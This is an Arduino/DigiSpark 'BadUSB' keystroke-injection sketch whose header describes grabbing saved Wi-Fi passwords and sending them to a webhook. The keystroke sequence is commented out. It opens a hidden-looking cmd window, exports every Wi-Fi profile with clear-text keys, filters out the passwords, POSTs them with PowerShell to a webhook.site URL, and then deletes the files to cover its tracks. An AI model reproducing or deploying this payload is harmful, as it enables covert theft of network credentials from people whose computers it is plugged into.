/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/

#include <DigiKeyboard.h>
#include <Arduino.h>

void setup() {
}

void loop() {
  DigiKeyboard.update();
  /*DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.delay(3000);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboardDe.delay(300);  
  DigiKeyboardDe.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboardDe.delay(500);  
  DigiKeyboardDe.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboardDe.delay(500);  
  DigiKeyboardDe.println("powershell Invoke-WebRequest -Uri https://webhook.site/780aa691-8bb6-4b34-9d83-f490231d07e0 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboardDe.delay(1000);  
  DigiKeyboardDe.println("del Wi-Fi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboardDe.delay(500);  
  DigiKeyboardDe.println("exit");
  DigiKeyboardDe.delay(100);  
  */
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}